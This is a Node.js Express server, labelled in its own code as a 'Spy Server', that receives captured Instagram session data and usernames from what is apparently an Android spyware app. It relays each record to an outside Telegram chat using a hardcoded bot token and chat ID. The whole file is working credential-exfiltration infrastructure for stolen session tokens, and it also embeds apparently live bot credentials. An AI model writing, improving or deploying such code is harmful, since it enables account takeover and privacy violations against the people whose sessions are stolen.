const express = require('express');
const app = express();
const https = require('https');

// Hardcoded Credentials
const TELEGRAM_BOT_TOKEN = "8841728340:AAFKyjKUVAvKVyQdGXyZg9PGVIXpANl9Gc4";
const TELEGRAM_CHAT_ID = "6055414562";

app.use(express.json());

// Endpoint for the Android App to push data to
app.post('/api/spy', (req, res) => {
    const data = req.body.sessionData;
    if (!data) return res.status(400).send('No data');

    // Format the message
    const message = `
🔥 <b>INSTAGRAM SESSION CAPTURED</b>
User: <code>${req.body.username || "Unknown"}</code>
Session: <code>${data.length > 200 ? data.substring(0, 200) + "..." : data}</code>
Time: ${new Date().toISOString()}
    `.trim();

    sendTelegram(message);
    res.send('Received');
});

function sendTelegram(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: "HTML"
    });

    const options = {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    };

    const req = https.request(url, options, (res) => {
        console.log(`Status: ${res.statusCode}`);
    });

    req.on('error', (e) => {
        console.error(`Error: ${e.message}`);
    });

    req.write(data);
    req.end();
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Spy Server running on port ${PORT}`);
});
